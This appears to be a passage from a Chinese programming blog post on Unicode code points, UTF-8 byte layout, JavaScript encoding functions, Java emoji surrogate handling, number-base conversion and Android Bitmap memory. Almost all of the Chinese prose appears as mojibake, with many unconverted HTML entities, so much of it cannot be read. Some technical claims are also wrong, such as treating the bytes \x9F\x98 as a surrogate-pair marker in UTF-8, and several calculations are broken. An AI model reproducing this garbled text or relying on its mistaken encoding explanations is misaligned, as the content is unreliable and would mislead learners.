,ä¾‹å¦‚U+4AE0ï¼Œå…±æ”¯æŒå…­ä¸‡å¤šä¸ªå­—ç¬¦ï¼‰ï¼›åœ¨é›¶å·å¹³é¢ä»¥å¤–çš„å­—ç¬¦åˆ™éœ€è¦ä½¿ç”¨äº”ä¸ªæˆ–å…­ä¸ªæ•°å­—ã€‚ æ‰€ä»¥ä¸€ä¸ªæ­£å„¿å…«ç»çš„Unicode çš„å†™æ³•æ˜¯U+4AE0 æ˜¥èŠ‚è¿™ä¿©å­—ï¼ŒæŸ¥è¡¨U+6625 U+8282 æµè§ˆå™¨é‡Œæ¶‰åŠç¼–ç çš„å‡½æ•°æœ‰ä¸‰ä¸ª:escape(åºŸå¼ƒï¼Œä¸è¦ç”¨)encodeURI() //è¾“å‡ºutf-8æ ¼å¼ï¼Œå¹¶åœ¨æ¯ä¸ªå­—èŠ‚å‰åŠ ä¸Š%encodeURIComponent() //å¯¹uriçš„ç»„æˆéƒ¨åˆ†è¿›è¡Œç¼–ç ï¼ŒåŒæ—¶åœ¨æ¯ä¸ªå­—èŠ‚å‰é¢åŠ ä¸Š%ï¼Œä½†æ˜¯ä¸€äº›encodeURIä¸ç¼–ç çš„å­—ç¬¦ï¼Œæ¯”å¦‚â€œ/:#â€ï¼ŒencodeURIComponentä¹Ÿç¼–ç äº†,encodeURIComponentä¸ç®¡é¡µé¢ç¼–ç æ˜¯ä»€ä¹ˆï¼Œç»Ÿä¸€è¿”å›utf-8 å®æµ‹å¦‚ä¸‹ï¼ˆæ˜¥èŠ‚çš„å¯¹åº”unicodeå­—ç¬¦é›†æ˜¯0x6625 0x8282ï¼Œç”¨utf-8è¡¨ç¤ºçš„è¯åº”è¯¥æ˜¯ï¼‰ escape(â€œæ˜¥èŠ‚â€)â€œ%u6625%u8282â€ //å’Œä¸Šé¢æŸ¥è¡¨çš„ç»“æœä¸€è‡´ï¼Œè¿™é‡Œé¢çš„æ•°å­—æ˜¯16è¿›åˆ¶encodeURI(â€œæ˜¥èŠ‚â€)â€œ%E6%98%A5%E8%8A%82â€ //ä¹Ÿæ˜¯16è¿›åˆ¶encodeURIComponent(â€˜æ˜¥èŠ‚â€™)â€œ%E6%98%A5%E8%8A%82â€ è®¸å¤šåœ¨çº¿utf-8è½¬æ¢ç½‘ç«™ç²˜è´´è¿›å»çš„æ•ˆæœæ˜¯è¿™æ ·çš„æ˜¥èŠ‚ -&gt; utf-8&#x6625;&#x8282; ##æ„Ÿè§‰è¿™è¿˜åªæ˜¯unicodeå•Šï¼Œ è¿™ä¸ªå¥‡æ€ªçš„&amp;#xè¡¨ç¤ºåé¢è·Ÿç€çš„æ˜¯16è¿›åˆ¶ã€‚ã€Œ&amp;#ã€å¼€å¤´çš„åæ¥åè¿›åˆ¶æ•°å­—ï¼Œä»¥ã€Œ&amp;#xã€å¼€å¤´çš„åæ¥åå…­è¿›åˆ¶æ•°å­—python3ä¸­æµ‹è¯• &#39;æ˜¥èŠ‚&#39;.encode(&#39;utf-8&#39;) b&#39;\\xe6\\x98\\xa5\\xe8\\x8a\\x82&#39; ##å’Œä¸Šé¢é‚£ä¸ªencodeURIComponentçš„æ–¹æ³•çš„ç»“æœæ˜¯ä¸æ˜¯ä¸€æ ·ä¸€æ ·çš„ã€‚ b&#39;\\xe6\\x98\\xa5\\xe8\\x8a\\x82&#39;.decode(&#39;utf-8&#39;) &#39;æ˜¥èŠ‚&#39; b&#39;\\u6625\\u8282&#39;.decode(&#39;unicode-escape&#39;) python3é‡Œé¢è¿™äº›\\xå’Œ\\uæ˜¯è¿™æ ·çš„åœ¨bytesä¸­ï¼Œæ— æ³•æ˜¾ç¤ºä¸ºASCIIå­—ç¬¦çš„å­—èŠ‚ï¼Œç”¨\\x##æ˜¾ç¤º,\\uæ˜¯unicodeçš„è½¬ä¹‰å­—ç¬¦ï¼Œå°±æ˜¯è¯´è¿™åé¢è·Ÿçš„éƒ½æ˜¯å­—ç¬¦çš„åå…­è¿›åˆ¶çš„unicodeè¡¨ç¤ºå½¢å¼ã€‚Pythonå¯¹bytesç±»å‹çš„æ•°æ®ç”¨å¸¦bå‰ç¼€çš„å•å¼•å·æˆ–åŒå¼•å·è¡¨ç¤ºï¼šx = bâ€™ABCâ€™ ä¸‹é¢çš„æ–¹æ³•å¯ä»¥è·å¾—æ±‰å­—çš„unicodeå€¼å’Œutf-8ç¼–ç  ##utf-8ç¼–ç  &gt;&gt;&gt; u&#39;æ˜¥èŠ‚&#39;.encode(&#39;utf-8&#39;) ## unicodeè½¬utf-8ï¼Œè§£ç å°±æ˜¯decodeäº† &#39;\\xe6\\x98\\xa5\\xe8\\x8a\\x82&#39; ## unicodeå­—ç¬¦ç  &gt;&gt;&gt; u&#39;æ˜¥èŠ‚&#39; u&#39;\\u6625\\u8282&#39; ## æ˜¥èŠ‚çš„Unicodeå°±æ˜¯U+6625 U+8282 ` ä½†è¿˜æ˜¯æ²¡æ³•è¡¨ç¤ºä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œä¾‹å¦‚Emoji,Dount Emojiçš„idæ˜¯127,849ã€‚åŸå› æ˜¯90å¹´ä»£çš„è®¾è®¡è€…æ²¡æœ‰æƒ³åˆ°ä»Šå¤©ä¼šå‡ºè¿™ä¹ˆå¤šemojiã€‚è§£å†³åŠæ³•æ˜¯â€surrogate pairsâ€ã€‚ä¸‹é¢è§£é‡Šï¼šjavaçš„Stringå…¶å®ä¸è¿‡æ˜¯ä¸€ä¸ªchar Arrayçš„wrapperï¼Œå¦‚æœåœ¨ideé‡Œé¢çœ‹çš„è¯ï¼ŒStringé‡Œé¢çš„char[]æ¯ä¸ªæ•°å­—éƒ½ä»£è¡¨è¿™ä¸ªä½ç½®çš„Unicode idã€‚æ‰€ä»¥ç»å¸¸åœ¨IDEé‡Œdebuçœ‹åˆ°Stringé‡Œé¢æœ‰char[],1=â€67â€ï¼›2=â€œ79â€ã€‚ã€‚ã€‚è¿™ç§ä¸œè¥¿ï¼Œå…¶å®ä¹Ÿå°±æ˜¯è¿™ä¸ªStringï¼ˆå­—ç¬¦ä¸²ï¼‰ä¸­å¯¹åº”ä½ç½®çš„å­—ç¬¦çš„unicodeç ã€‚å¯¹äºEmojiï¼Œä¼šç”¨ä¸¤ä¸ªcharæ¥è¡¨ç¤ºã€‚å¦‚ä½•ç¡®å®šç›¸é‚»çš„ä¸¤ä¸ªå­—ç¬¦åº”è¯¥ç”¨æ¥è¡¨ç¤ºä¸€ä¸ªEmojiè€Œæ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„å­—ç¬¦ï¼Ÿå»çœ‹Emojiçš„Unicodeè¡¨çš„è¯ï¼Œè¿™å››ä¸ªbyteè¿åœ¨ä¸€èµ·ä¸€èˆ¬é•¿è¿™æ ·ï¼š \\xF0\\x9F\\x98\\x81 \\xF0\\x9F\\x98\\x82 \\xF0\\x9F\\x98\\x83 \\xF0\\x9F\\x98\\x84 ä¸­é—´é‚£ä¸ª\\x9F\\x98å°±æ˜¯surrogate pairsçš„æ ‡å¿—æ‰€ä»¥ï¼Œè¦è®¤è¯†åˆ°charæœ¬èº«è¿˜æ˜¯ä¸è¶³ä»¥è¡¨ç¤ºæ‰€æœ‰çš„å­—ç¬¦è¿™æ ·çš„ä»£ç è¦æ˜¯æ‹¿æ¥æ‰“å°Emojiï¼Œåªä¼šè®²åŸæœ¬4byteçš„Emojiæ‹†æˆ2ä¸ªcharï¼Œæ‰€ä»¥å°±åœ¨consoleé‡Œé¢çœ‹åˆ°ä¸€äº›ä¹±ç ã€‚ String s = &quot;ä¸€äº›åŒ…å«Emojiçš„æ–‡å­—&quot; for(int i =0 ,size = s.length();i&lt;size;i++){ char c = s.charAt(i); System.out.println(&quot;The Character at %d is &#39;%c&#39;%n&quot;,i,c); } å¤„ç†emojiçš„æ­£åˆ™ï¼Œä¸»è¦æ˜¯pythonæä¾›äº†ä¸€ä¸ªæ‰«æå‡ºemojiçš„æ­£åˆ™ def test_emoji(): try: # Wide UCS-4 build myre = re.compile(u&#39;[&#39; u&#39;\\U0001F300-\\U0001F64F&#39; u&#39;\\U0001F680-\\U0001F6FF&#39; u&#39;\\u2600-\\u2B55]+&#39;, re.UNICODE) except re.error: # Narrow UCS-2 build myre = re.compile(u&#39;(&#39; u&#39;\\ud83c[\\udf00-\\udfff]|&#39; u&#39;\\ud83d[\\udc00-\\ude4f\\ude80-\\udeff]|&#39; u&#39;[\\u2600-\\u2B55])+&#39;, re.UNICODE) sss = u&#39;I have a dog \\U0001f436 . You have a cat \\U0001f431 ! I smile \\U0001f601 to you!&#39; print(sss) print(myre.sub(&#39;[Emoji]&#39;, sss)) # æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„Emoji print(myre.findall(sss)) # æ‰¾å‡ºå­—ç¬¦ä¸²ä¸­çš„Emoji æ­£ç¡®çš„åšæ³•æ˜¯: String emoji = &quot;å˜¿å˜¿\\uD83D\\uDC37å’¦ä¸¶æ¸&quot;; System.out.println(emoji); for(int i =0 ,size = emoji.length();i&lt;size;){ int c = emoji.codePointAt(i); System.out.println(String.format(&quot;The Character at %d is &#39;%c&#39;%n&quot;, i,c)); i+=Character.charCount(c);//æ­£ç¡®è¯†åˆ«charæ•°é‡ } è¾“å‡º:å˜¿å˜¿ğŸ·å’¦ä¸¶æ¸The Character at 0 is â€˜å˜¿â€™ The Character at 1 is â€˜å˜¿â€™ The Character at 2 is â€˜ğŸ·â€™ The Character at 4 is â€˜å’¦â€™ The Character at 5 is â€˜ä¸¶â€™ The Character at 6 is â€˜æ¸â€™ emojiæœ‰ä¸€ä¸ªç‰¹ç‚¹ï¼Œä¸¤ä¸ªchar(4ä¸ªbyteçš„ç¬¬äºŒä¸ªæ˜¯3D,ç¬¬ä¸‰ä¸ªæ˜¯DCï¼Œè¿™ä¿©å«åšsurrogate pairsï¼Œå½“ç„¶ç¬¬äºŒä¸ªä¸ä¸€å®šæ˜¯3Dï¼Œè€Œæ˜¯ä¸€ä¸ªèŒƒå›´å†…ï¼Œå…·ä½“åœ¨isHighSurrogateä¸­) codePointAt(int index)çš„å®ç°åœ¨codePointAtImplä¸­ï¼Œäº‹å®ä¸Šå°±æ˜¯åˆ¤æ–­ä½äºindexçš„è¿™ä¸ªcharæ˜¯å¦isHighSurrogateï¼ˆç¬¬äºŒä¸ªæ˜¯ä¸æ˜¯3Dï¼‰ï¼Œå¦‚æœæ˜¯ï¼Œè·Ÿç€åˆ¤æ–­isLowSurrogate(++index)ï¼ˆç¬¬ä¸‰ä¸ªæ˜¯ä¸æ˜¯DCï¼‰. æ±‰å­—ç”¨UTF-8ç¼–ç çš„è¯ï¼Œæœ‰äº›è¿˜æ˜¯ä¼šè¶…å‡ºä¸¤ä¸ªå­—èŠ‚çš„ï¼Œæ¯”å¦‚â€œğ ®·â€ï¼Œwikiç»™è¿™è´§çš„è§£é‡Šã€‚åè¿›åˆ¶æ˜¯134071ï¼Œå·²ç»è¶…å‡ºä¸¤ä¸ªå­—èŠ‚(65536)äº†ã€‚è½¬æˆåå…­è¿›åˆ¶çš„è¯å°±æ˜¯â€œF0 A0 AE B7â€ï¼Œutf-8æœ¬èº«å°±æ˜¯å¯å˜é•¿åº¦çš„ç¼–ç formatï¼Œæ‰€ä»¥è¿™è´§å äº†4ä¸ªå­—èŠ‚ä¹Ÿæ­£å¸¸ã€‚ String w = &quot;\\uD842\\uDFB7&quot;; //è¿™ä¸ªâ€œ\\uâ€æ˜¯ideè‡ªå·±åŠ ä¸Šå»çš„ï¼Œæ³¨æ„å’Œä¸Šé¢çš„åå…­è¿›åˆ¶ä¸ä¸€æ ·ï¼Œæ˜¯å› ä¸ºutf-8å‰é¢è¦åŠ ä¸€äº›0,1ä»€ä¹ˆçš„ System.out.println(String.valueOf(hex)); // 134071 for (int i = 0,size = w.length(); i &lt;size;) { int c = w.codePointAt(i); System.out.println(String.format(&quot;The character at %d is %c &quot;, i, c)); //æˆåŠŸæ‰“å°å‡ºè¿™ä¸ªæ±‰å­— i += Character.charCount(c); } jniä¸­çš„GetStringUTFCharsè¿”å›çš„å¹¶ä¸æ˜¯utf8 array è€Œæ˜¯Modified UTF-8 3.3 UTF-8å‡ºç°8-bit Unicode Transformation Formatäº1998å¹´å‡ºç°ï¼Œä¹‹å‰æåˆ°äº†2ä¸ªbyteè¡¨ç¤ºä¸€ä¸ªå­—ç¬¦å®åœ¨å¤ªæµªè´¹äº†ï¼Œutf-8çš„åšæ³•æ˜¯å°†æ¯ä¸ªå­—ç¬¦æ‰€éœ€è¦çš„é•¿åº¦å˜æˆå¯å˜çš„ã€‚WIKIä¸ŠUTF-8çš„æè¿° å¤šæ•°å­—ç¬¦åªç”¨1byteï¼Œæœ‰äº›ç”¨åˆ°2,3ä¸ªbyteï¼ŒDonutçš„Emojiç”¨4bytes. &lt;=7ä¸ªbitçš„ï¼ˆASCIIï¼‰ï¼š 0XXXXXX (æˆ‘ç”¨Xè¡¨ç¤ºå¯ä»¥è¢«å¡«å……çš„ç©ºé—´)&lt;=11ä¸ªbit ï¼š110XXXXX 10XXXXXX (ç¬¬ä¸€ä¸ªbyteä»¥110å¼€å¤´ï¼Œåé¢ä»¥10å¼€å¤´)&lt;=16ä¸ªbit : 1110XXXX 10XXXXXX 10XXXXXX (ç¬¬ä¸€ä¸ªbyteä»¥1110å¼€å¤´ï¼Œåé¢è·Ÿä¸¤ä¸ª10å¼€å¤´çš„bytes)&lt;=21ä¸ªbit : 11110XXX 10XXXXXX 10XXXXXX 10XXXXXX (ç¬¬ä¸€ä¸ªbyteä»¥11110å¼€å¤´ï¼Œåé¢è·Ÿä¸‰ä¸ª10å¼€å¤´çš„bytes) 00000000 â€“ 0000007F: 0xxxxxxx00000080 â€“ 000007FF: 110xxxxx 10xxxxxx00000800 â€“ 0000FFFF: 1110xxxx 10xxxxxx 10xxxxxx00010000 â€“ 001FFFFF: 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx UTF-8ç¼–ç æœ€é•¿6ä¸ªå­—èŠ‚ ç°åœ¨æ¥çœ‹çœ‹ç½‘ä¸Šé‚£äº›å¸¸ç”¨çš„ä¸­æ–‡è½¬UTF-8å·¥å…·æ€ä¹ˆç”¨ï¼Œéšä¾¿æ‰¾ä¸€ä¸ªæ‰¾ä¸€ä¸ªç«™é•¿ä¹‹å®¶è¾“å…¥â€œç¾â€ ï¼Œå¯¹åº”çš„utf-8ç¼–ç æ˜¯â€&amp;#x7F8Eâ€ï¼Œè½¬Unicodeæ˜¯â€\\u7f8eâ€æŸ¥äº†ä¸‹â€œç¾â€è¿™ä¸ªå­—è¿˜çœŸæ˜¯â€œ7F8Eâ€ã€‚è¿™é‡Œæœ‰å¼ æ¯”è¾ƒå¥½çš„è¡¨æ ¼ã€‚äºŒè¿›åˆ¶è½¬unicodeç›´æ¥ç²˜è´´åˆ°è¿™é‡Œçš„è½¬16è¿›åˆ¶å°±å¯ä»¥äº†ã€‚è½¬utf-8çš„è¯ï¼Œæ¥çœ‹è¿™ä¸ªå…¶å®æ˜¯15ä¸ªbitã€‚æ‰€ä»¥è¿™æ ·å†™ 7F8Eæ˜¾ç„¶æ˜¯16è¿›åˆ¶ï¼Œè½¬æˆåè¿›åˆ¶æ˜¯32654ã€‚ è½¬æˆäºŒè¿›åˆ¶æ˜¯11111111 0001110(æ³¨æ„åªæœ‰15ä¸ªbit,å‰é¢8ä¸ª1)ã€‚ è½¬utf-8çš„æ—¶å€™ï¼Œä»åå¾€å‰å¾€ä¸Šé¢çš„XXXXé‡Œé¢å¡«å…… 1110XXXX 10XXXXXX 10XXXXXXå°±å˜æˆäº† 1110X111 10111110 10001110ï¼ˆæ³¨æ„æœ‰ä¸€ä¸ªä½ç½®è¿˜ç©ºç€ï¼‰ Xç”¨0è¡¥ä¸Šï¼Œæœ€ç»ˆå¾—åˆ°æ±‰å­—&quot;ç¾&quot;çš„utf-8äºŒè¿›åˆ¶ç¼–ç  11100111 10111110 10001110 è¯»å–çš„æ—¶å€™ 1111 111100 01110(7f8e) ï¼Œè¿™ä¸‰ä¸ªbyteå°±ä»£è¡¨æ±‰å­—â€ç¾â€ã€‚ Integer.toBinaryStringæä¾›äº†å°†ä¸€ä¸ªint(åè¿›åˆ¶)è½¬æˆäºŒè¿›åˆ¶å­—ç¬¦çš„æ–¹æ³•,å³ç»™ä¸€ä¸ªåè¿›åˆ¶æ•°å­—ï¼Œè½¬æˆâ€01010101110101â€è¿™æ ·çš„Stringï¼Œæ–¹ä¾¿çœ‹æ‡‚ã€‚ å³è½¬æˆä¸€å¤§å †â€0101010110â€æ¥è¯•ä¸€ä¸‹ï¼Œçœ‹æ€ä¹ˆè·å¾—è¿™äº›â€01010101110101â€. public static void main(String[] args) { String s = &quot;ç¾&quot;; char[] array = s.toCharArray(); for (int i = 0,size = array.length; i &lt; size; i++) { System.out.println(array[i]); System.out.println(Integer.toBinaryString(array[i])); } } //è¾“å‡º 111111110001110 å¤äººè¯šä¸æˆ‘æ¬ºä¹Ÿåè¿‡æ¥ï¼Œç”¨ä¸€å¤§å †â€0101010111010â€ä¹Ÿèƒ½åœ¨javaä»£ç é‡Œå†™ä¸€ä¸ªæ±‰å­—å‡ºæ¥ char c = 0b111111110001110; String ns = new String(new char[]{c}); System.out.println(ns); 0bæ˜¯java 1.7å¼€å§‹å¯ä»¥ä½¿ç”¨çš„ç”¨æ¥ç›´æ¥åœ¨ä»£ç é‡Œå†™äºŒè¿›åˆ¶çš„æ–¹å¼ã€‚so if you want improve the cooleness of your codeâ€¦å½“ç„¶javaæ—©å°±å‡†å¤‡å¥½äº†ç›¸åº”çš„æ–¹æ³•(äºŒè¿›åˆ¶-å…«è¿›åˆ¶-åè¿›åˆ¶-åå…­è¿›åˆ¶)ä¹‹é—´çš„äº’ç›¸è½¬åŒ– åè¿›åˆ¶è½¬æˆåå…­è¿›åˆ¶ï¼š String Integer.toHexString(int i) åè¿›åˆ¶è½¬æˆå…«è¿›åˆ¶ String Integer.toOctalString(int i) åè¿›åˆ¶è½¬æˆäºŒè¿›åˆ¶ String Integer.toBinaryString(int i) åå…­è¿›åˆ¶è½¬æˆåè¿›åˆ¶ Integer.valueOf(&quot;FFFF&quot;,16).toString() //ä¸èƒ½å¤„ç†å¸¦å‰ç¼€çš„æƒ…å†µ 0x å…«è¿›åˆ¶è½¬æˆåè¿›åˆ¶ Integer.valueOf(&quot;76&quot;,8).toString() //å‰ç¼€0å¯ä»¥è¢«å¤„ç† äºŒè¿›åˆ¶è½¬åè¿›åˆ¶ Integer.valueOf(&quot;0101&quot;,2).toString() Stringè¿˜æœ‰ä¸€ä¸ªgetByte(Charset)æ–¹æ³•ï¼Œå¯ä»¥ä¼ å„ç§charsetè¿›å»ï¼Œi/oå¼ºè°ƒçš„æ˜¯è¯»å†™ä½¿ç”¨çš„éƒ½æ˜¯ç›¸åŒçš„ç¼–ç ï¼Œå¦åˆ™å°±ä¼šå‡ºç°ä¹±ç ã€‚ 4.æ¥ä¸‹æ¥è®²é¢œè‰²é¢œè‰²å°±æ˜¯RGBçš„ç»„åˆ,å±å¹•ä¸­æ¯ä¸€ä¸ªåƒç´ éƒ½æ˜¯ç”±ä¸‰ä¸ªsubPixelç»„æˆçš„(åˆ†åˆ«æ˜¯çº¢ç»¿è“)ï¼Œæ‰€ä»¥åœ¨psé‡Œé¢ç»å¸¸ä¼šç¢°åˆ°255,XXX,XXXè¿™ç§ä¸œè¥¿ã€‚0,0,0ä»£è¡¨å…¨é»‘ï¼Œ255,255,255(0-256ä¹Ÿå°±æ˜¯ä¸€ä¸ªbyteèƒ½å¤Ÿè¡¨è¾¾çš„èŒƒå›´)ä»£è¡¨çº¯ç™½ã€‚å…¶ä»–çš„é¢œè‰²éƒ½æ˜¯è¿™ä¸‰ç§é¢œè‰²çš„ç»„åˆï¼Œæ‰€ä»¥ç”¨ä¸‰ä¸ªbyteå°±èƒ½è¡¨è¾¾ä¸€ç§é¢œè‰²ã€‚æ‰€ä»¥ç»å¸¸åœ¨javaä»£ç é‡Œçœ‹åˆ°ï¼š view.setBackgroundColor(Color.parseColor(&quot;#87CEFA&quot;));//ä¸‰ä¸ªbytes //æˆ–è€… Color.RED //è¿˜æœ‰æ›´å¥½ç©çš„ tv.setTextColor(Color.rgb(255, 255, 255)); //&quot;#XX XX XX&quot; åå…­è¿›åˆ¶ï¼Œ256çš„èŒƒå›´ï¼Œåªéœ€è¦2ä½æ•°å­—å°±å¥½äº†ï¼Œæ‰€ä»¥æ€»æ˜¯çœ‹åˆ°00,01,10,...ffè¿™æ · åœ¨xmlé‡Œé¢æ˜¯è¿™æ ·çš„ &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;resources&gt; &lt;color name=&quot;wl_blue&quot;&gt;#2878ff&lt;/color&gt; &lt;color name=&quot;wl_gray&quot;&gt;#c1c1c1&lt;/color&gt; &lt;color name=&quot;text_color&quot;&gt;#434343&lt;/color&gt; &lt;/resources&gt; åªä¸è¿‡å°‘å†™äº†0xè€Œå·²å…³äºåå…­è¿›åˆ¶ï¼Œå¤šè¯´ä¸€ç‚¹ Colors: #ffffff URL escaping:http://example.com/?q=hello%20world Unicode code points: U+2020 ipv6åœ°å€ï¼š 2001âˆ¶0d02âˆ¶0000âˆ¶0000âˆ¶0014âˆ¶0000âˆ¶0000âˆ¶0095 éƒ½æ˜¯åå…­è¿›åˆ¶(Dexadecimal)çš„åº”ç”¨ 5.æœ‰äº†é¢œè‰²å°±æœ‰äº†å›¾ç‰‡3ä¸ªå°åƒç´ ç»„æˆä¸€ä¸ªåƒç´ ï¼Œå±å¹•ä¸Šæ— æ•°ä¸ªåƒç´ (é¢œè‰²çš„ç‚¹,æ¯ä¸ªåƒç´ å¤§å°ä¸º3bytes)ç»„æˆäº†å›¾ç‰‡ï¼Œå›¾ç‰‡åªæ˜¯ä¸€ä¸ªé¢œè‰²çš„2ç»´æ•°ç»„(æ•°ç»„çš„æ¯ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªé¢œè‰²)ã€‚é‚£ä¹ˆä¸€å¼ 6464pixelçš„å›¾æ ‡å¤§å°ä¸ºï¼Œ64643 = 12 288bytesï¼Œç°åœ¨çš„å±å¹•åŠ¨è¾„ç™¾ä¸‡åƒç´ ï¼Œ19801080çš„å›¾ç‰‡ï¼Œå¤§å°æ˜¯198010803 = 6.4MBã€‚ç°åœ¨æ˜ç™½Androidä¸Šå›¾ç‰‡ä¸ºä»€ä¹ˆè¿™ä¹ˆå®¹æ˜“oomäº†å§ã€‚è¿™è¿˜åªæ˜¯rgbï¼Œå…¶å®æ­£è§„å›¾ç‰‡åº”è¯¥è¿˜æœ‰ä¸€ä¸ªAlphaï¼Œå³ARGB,å¥½äº†ï¼Œè¿™ä¸‹å ç”¨äº†192010804 = 8MBã€‚æ‰€ä»¥Androidåœ¨Bitmapé‡Œé¢æä¾›äº†ä¸€äº›é€‰é¡¹ï¼š BitMap.config.ALPAH_8 ï¼šåªå­˜å‚¨é€æ˜åº¦ï¼Œä¸å­˜å‚¨é¢œè‰²ä¿¡æ¯ BitMap.config.ARGB_4444(Deprecated) ï¼šEach pixel is stored on 2 bytes. (èŠ‚çœäº†ä¸€åŠ) BitMap.config.ARGB_8888 : Each pixel is stored on 4 bytes. Each channel (RGB and alpha for translucency) is stored with 8 bits of precision (256 possible values.) This configuration is very flexible and offers the best quality. It should be used whenever possible.è¿™ä¹Ÿå°±æ˜¯ä¸Šé¢æåˆ°çš„ä¸€ä¸ªåƒç´ ä¸‰ä¸ªå°åƒç´ å¤–åŠ ä¸€ä¸ªé€æ˜åº¦çš„ç®—æ³•ã€‚ Bitmap.Config RGB_565ï¼š Each pixel is stored on 2 bytes and only the RGB channels are encodedã€‚(èƒ½è¿™ä¹ˆçœæ˜¯å› ä¸ºè¿™é‡Œé¢ç”¨5bitè¡¨ç¤ºredï¼Œ6bitè¡¨ç¤ºgreenï¼Œ5bitè¡¨ç¤ºblueï¼Œè¿™ä¸ªåˆ’åˆ†ä¼¼ä¹æ˜¯UIè¡Œä¸šçš„æ ‡å‡†ï¼Œç”¨äº†ä¸€äº›è¿‘ä¼¼ç®—æ³•ã€‚æ‰€ä»¥ç»å¸¸çœ‹åˆ°æœ‰äººæ‹¿ç€ä¸¤å¼ ARGB_8888å’ŒRGB_565çš„å›¾ç‰‡æ¥æ¯”è¾ƒï¼Œç„¶åæ‰¹åˆ¤RGB_565é¢œè‰²ä¸å‡†)ã€‚RBG_565æœ¬æ¥å°±ä¸æ˜¯å†²ç€é¢œè‰²å‡†ç¡®å»çš„ã€‚å…¶å®è¿˜æœ‰RBG_232è¿™ç§æ›´åŠ ä¸å‡†ç¡®çš„ã€‚ æ—¥å¸¸å¼€å‘éƒ½æ˜¯ç”¨çš„ARGB_8888,ä¸€ä¸ªåƒç´ è¦ç”¨4byteså†…å­˜ï¼Œæ‰€ä»¥bitmapçœŸçš„éå¸¸è€—å†…å­˜ã€‚å…¬å¼åœ¨cppæºç ä¸­ if (willScale &amp;&amp; decodeMode != SkImageDecoder::kDecodeBounds_Mode) { scaledWidth = int(scaledWidth * scale + 0.5f); scaledHeight = int(scaledHeight * scale + 0.5f); } æœ€ç»ˆçš„å¤§å°å°±æ˜¯ scaledWidthscaledHeight4 ä¸€å¼ 522*686çš„PNG å›¾ç‰‡ï¼Œæˆ‘æŠŠå®ƒæ”¾åˆ° drawable-xxhdpi ç›®å½•ä¸‹ï¼Œåœ¨ä¸‰æ˜Ÿs6ä¸ŠåŠ è½½ï¼Œå ç”¨å†…å­˜2547360Bï¼Œå…¶ä¸­ density å¯¹åº” xxhdpi ä¸º480ï¼ŒtargetDensity å¯¹åº”ä¸‰æ˜Ÿs6çš„å¯†åº¦ä¸º640ï¼š ï¼ˆå®é™…é•¿/xxxhdpiæ–‡ä»¶å¤¹å¯¹åº”çš„å€¼ï¼‰ æ‰‹æœºdpi (å®é™…å®½/xxxhdpiæ–‡ä»¶å¤¹å¯¹åº”çš„å€¼) 4522/480 640 686/480 640 * 4 = 2546432Bï¼ˆåŒæ ·ä¸€å¼ å›¾ç‰‡ï¼Œæ”¾åœ¨xxxhdpiå ç”¨å†…å­˜&lt; æ”¾åœ¨xxhdpi &lt; æ”¾åœ¨xhdpi,ç»éªŒä¹‹è°ˆï¼Œæ”¾åœ¨xxxhdpiæ˜¯ä¸€ç§é™ä½å†…å­˜å ç”¨çš„æ–¹å¼ï¼‰ ä¸€ç¯‡ç ”ç©¶bitmapå­˜å‚¨ä½ç½®çš„æ–‡ç« ï¼Œè®²åˆ°cppå±‚ã€‚ æ‰¾åˆ°äº†cppå±‚è°ƒç”¨javaå±‚çš„gVMRuntime_newNonMovableArrayæ–¹æ³•:è‡³å°‘åˆ°äº†7.0è¿˜æ˜¯é€šè¿‡jniæŠŠåƒç´ è¿™ä¸ªæ•°æ®å¤§æˆ·æ”¾åˆ°äº†java heapä¸Šé¢ android::Bitmap* GraphicsJNI::allocateJavaPixelRef(JNIEnv* env, SkBitmap* bitmap, SkColorTable* ctable) { jbyteArray arrayObj = (jbyteArray) env-&gt;CallObjectMethod(gVMRuntime, gVMRuntime_newNonMovableArray, gByte_class, size); return wrapper; } Android Bitmapå˜è¿ä¸åŸç†è§£æï¼ˆ4.x-8.xï¼‰è°ˆåˆ°äº†è¿™ä¸€å—çš„åˆ†é…éå¸¸ä¹± æ ¹æ®Dianne Hackbornçš„è§£é‡Š A Bitmap is just an interface to some pixel data. The pixels may be allocated by Bitmap itself when you are directly creating one, or it may be pointing to pixels it doesnâ€™t own such as what internally happens to hook a Canvas up to a Surface for drawing. (A Bitmap is created and pointed to the current drawing buffer of the Surface.) çœ‹ä¸‹javaå±‚çš„bitmapçš„æˆå‘˜å˜é‡ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«å¤§çš„æ•°ç»„ï¼Œæ‰€ä»¥çœŸæ­£çš„åƒç´ æ•°æ®çš„å­˜å‚¨ä¸æ˜¯æ”¾åœ¨bitmapè¿™ä¸ªå¯¹è±¡é‡Œçš„ã€‚ æ ¹æ®æ‡‚c++äººçš„åˆ†æï¼Œé€šè¿‡è°ƒç”¨jniçš„CallObjectMethodæ¥è°ƒç”¨gVimRuntimeçš„gVMRuntime_newNonMovableArrayæ–¹æ³•æ¥åˆ›å»ºä¸€ä¸ªæ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„ç±»å‹å’Œé•¿åº¦åˆ†åˆ«ç”¨gByte_classå’Œsizeè¡¨ç¤ºã€‚CallObjectMethodå‡½æ•°è¿”å›ä¸€ä¸ªjbyteArrayï¼Œæ­¤æ—¶ï¼Œåœ¨Javaå±‚å·²ç»åˆ›å»ºäº†ä¸€ä¸ªé•¿åº¦ä¸ºsizeçš„byteæ•°ç»„ã€‚ ä¹Ÿå°±ç¬¦åˆofficial documentä¸­è¯´çš„ the pixel data is stored on the Dalvik heap along with the associated bitmap. è¯´æ³•äº†ã€‚æˆ‘çš„ç†è§£æ˜¯ï¼Œåºå¤§çš„åƒç´ æ•°æ®æ˜¯æ”¾åœ¨javaå±‚çš„ï¼Œå› 